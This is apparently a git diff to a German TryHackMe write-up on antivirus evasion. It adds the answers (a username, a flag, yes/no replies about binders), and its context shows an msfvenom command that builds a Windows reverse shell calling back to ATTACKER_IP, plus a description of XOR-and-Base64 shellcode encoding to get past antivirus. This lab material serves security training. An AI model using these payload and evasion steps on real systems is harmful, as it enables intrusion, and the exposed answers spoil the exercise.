@@ -40,10 +40,12 @@ Windows Defender
 
 Wie lautet der Name des Benutzerkontos, auf das du Zugriff hast?
 ```
+av-victim
 ```
 
 Erstelle eine funktionierende Shell auf der Opfermaschine und lies die Datei auf dem Desktop des Benutzers. Was ist die Flagge?
 ```
+THM{H3ll0-W1nD0ws-Def3nd3r!}
 ```
 
 # Task 3 - PE Struktur
@@ -789,7 +791,7 @@ Lassen Sie uns mit der Generierung einer Reverse Shell im CSharp-Format mit msfv
 user@AttackBox$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
 ```
 
-Der Encoder
+### Der Encoder
 
 Bevor wir unseren tatsächlichen Payload erstellen, werden wir ein Programm erstellen, das den von msfvenom generierten Shellcode nimmt und ihn nach Belieben verschlüsselt. In diesem Fall werden wir den Payload zuerst mit einem benutzerdefinierten Schlüssel XORieren und dann mit Base64 codieren. Hier ist der vollständige Code für den Encoder (Sie finden diesen Code auch auf Ihrem Windows-Rechner unter C:\Tools\CS Files\Encryptor.cs):
 
@@ -1104,12 +1106,12 @@ Versuchen Sie gerne, Ihre gebundene ausführbare Datei auf der THM Antivirus Che
 ## Fragen:
 Wird ein Binder helfen, AV-Lösungen zu umgehen? (ja/nein)
 ```
-
+nein
 ```
 
 Kann ein Binder verwendet werden, um einen Payload als legitime ausführbare Datei erscheinen zu lassen? (ja/nein)
 ```
-
+ja
 ```
 
 # Task 11 - Abschluss
